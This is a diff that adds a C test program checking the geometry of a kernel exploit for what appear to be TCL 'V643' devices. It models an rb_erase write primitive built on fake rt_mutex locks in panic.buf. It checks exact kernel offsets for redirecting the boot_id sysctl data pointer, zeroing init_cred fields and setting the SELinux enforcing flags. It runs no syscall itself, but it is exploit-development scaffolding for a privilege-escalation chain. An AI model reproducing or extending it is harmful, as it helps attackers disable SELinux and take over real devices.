@@ -1,0 +1,114 @@
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+
+#include "tcl_v643/compat_select_geometry.h"
+
+static int fail(const char *message) {
+  fprintf(stderr, "FAIL: %s\n", message);
+  return 1;
+}
+
+/* Model the exact one-child branch seen in V643 rb_erase at
+ * ffffffc0089747b8.  This deliberately uses local byte arrays only; it does
+ * not contain a syscall, a runtime kernel pointer or an exploit trigger. */
+int main(void) {
+  const uint64_t scratch_start = TCL_V643_PANIC_BUF_OFF;
+  const uint64_t scratch_end = scratch_start + TCL_V643_PANIC_BUF_SIZE;
+
+  if ((scratch_start & 7) != 0)
+    return fail("panic.buf is not naturally aligned for rt_mutex fields");
+  if (TCL_V643_DIRECT_LOCK_SLOT_STRIDE != 0x20)
+    return fail("fake-lock stride no longer matches rt_mutex_base size");
+  if (TCL_V643_DIRECT_LOCK_SLOT_COUNT *
+          TCL_V643_DIRECT_LOCK_SLOT_STRIDE != TCL_V643_PANIC_BUF_SIZE)
+    return fail("fake-lock slots do not exactly cover panic.buf");
+  if (scratch_start +
+          (TCL_V643_DIRECT_LOCK_SLOT_COUNT - 1) *
+              TCL_V643_DIRECT_LOCK_SLOT_STRIDE +
+          TCL_V643_DIRECT_LOCK_SLOT_STRIDE != scratch_end)
+    return fail("last fake lock exceeds panic.buf");
+
+  /* Abstract kernel objects.  pc models rb_node.__rb_parent_color, target
+   * models rb_left, and data_field models ctl_table.data. */
+  uint8_t parent_object[24];
+  uint64_t data_field = UINT64_C(0x1111111111111111);
+  const uint64_t original_low = UINT64_C(0x8877665544332211);
+  const uint64_t parent_address = UINT64_C(0xffffffc012340000);
+  const uint64_t data_field_address = UINT64_C(0xffffffc056780000);
+  const uint64_t fake_node_address = UINT64_C(0xffff800000001000);
+
+  memset(parent_object, 0, sizeof(parent_object));
+  memcpy(parent_object, &original_low, sizeof(original_low));
+
+  /* Exact V643 rb_erase one-left-child effects:
+   *   target->__rb_parent_color = pc
+   *   parent->rb_right = target, unless parent->rb_left == fake node.
+   * For an ordinary parent object the comparison misses, so +8 is clobbered.
+   * Here target is the ctl_table.data field. */
+  data_field = parent_address;
+  uint64_t parent_left = 0;
+  const unsigned collateral_off =
+      parent_left == fake_node_address ? 16U : 8U;
+  memcpy(parent_object + collateral_off, &data_field_address,
+         sizeof(data_field_address));
+
+  if (data_field != parent_address)
+    return fail("rb_erase did not redirect ctl_table.data");
+
+  uint64_t readback[2] = {0, 0};
+  memcpy(&readback[0], parent_object, sizeof(readback[0]));
+  memcpy(&readback[1], parent_object + 8, sizeof(readback[1]));
+  if (readback[0] != original_low)
+    return fail("readback low word is not the original parent word");
+  if (readback[1] != data_field_address)
+    return fail("collateral marker does not validate the readback");
+
+  if (TCL_V643_BOOT_ID_CTL_DATA_FIELD_OFF != 0x027f6500ULL ||
+      TCL_V643_SYSCTL_BOOTID_OFF != 0x0295bce1ULL)
+    return fail("V643 boot_id anchors changed");
+
+  /* A parent_color of zero is a useful repair primitive: rb_erase writes
+   * zero to the chosen target, skips the parent dereference and puts target
+   * only in the current scratch lock's rb_root.  Exact V643 init_cred bytes
+   * show that the word at init_cred+8 (gid/suid) starts as zero. */
+  uint64_t init_cred_gid_suid = UINT64_C(0xfeedfacefeedface);
+  const uint64_t zero_parent_color = 0;
+  init_cred_gid_suid = zero_parent_color;
+  if (init_cred_gid_suid != 0)
+    return fail("zero-parent repair does not restore init_cred+8");
+
+  /* The exact symbol interval for non_irq_wake_reason is 0x100 bytes.  The
+   * V643 parent candidate and its collateral qword both remain inside it. */
+  const uint64_t wake_start = TCL_V643_NON_IRQ_WAKE_REASON_OFF;
+  const uint64_t wake_end = wake_start +
+                            TCL_V643_NON_IRQ_WAKE_REASON_SIZE;
+  const uint64_t selinux_parent = TCL_V643_KIMAGE_TEXT_BASE +
+                                  TCL_V643_SELINUX_STAMP_PARENT_OFF;
+  if (TCL_V643_SELINUX_STAMP_PARENT_OFF < wake_start ||
+      TCL_V643_SELINUX_STAMP_PARENT_OFF + 16 > wake_end)
+    return fail("SELinux parent/collateral escapes non_irq_wake_reason");
+  if ((selinux_parent & 0xffff) != 0 ||
+      ((selinux_parent >> 16) & 0xff) == 0)
+    return fail("SELinux parent does not encode 0,0,nonzero in low bytes");
+  uint8_t selinux_prefix[8];
+  memcpy(selinux_prefix, &selinux_parent, sizeof(selinux_prefix));
+  if (selinux_prefix[0] != 0 || selinux_prefix[1] != 0 ||
+      selinux_prefix[2] == 0)
+    return fail("SELinux enforcing/checkreqprot/initialized prefix is wrong");
+
+  printf("panic scratch: [%#llx,%#llx) = %u slots x %#x\n",
+         (unsigned long long)scratch_start,
+         (unsigned long long)scratch_end,
+         TCL_V643_DIRECT_LOCK_SLOT_COUNT,
+         TCL_V643_DIRECT_LOCK_SLOT_STRIDE);
+  printf("boot_id: ctl_table.data=+%#llx uuid=+%#llx\n",
+         (unsigned long long)TCL_V643_BOOT_ID_CTL_DATA_FIELD_OFF,
+         (unsigned long long)TCL_V643_SYSCTL_BOOTID_OFF);
+  printf("SELinux candidate: parent=+%#llx collateral stays in "
+         "non_irq_wake_reason\n",
+         (unsigned long long)TCL_V643_SELINUX_STAMP_PARENT_OFF);
+  puts("PASS: exact V643 direct rb_erase/readback geometry is modeled");
+  puts("CAUTION: every modeled read/write also clobbers parent_color+8");
+  return 0;
+}
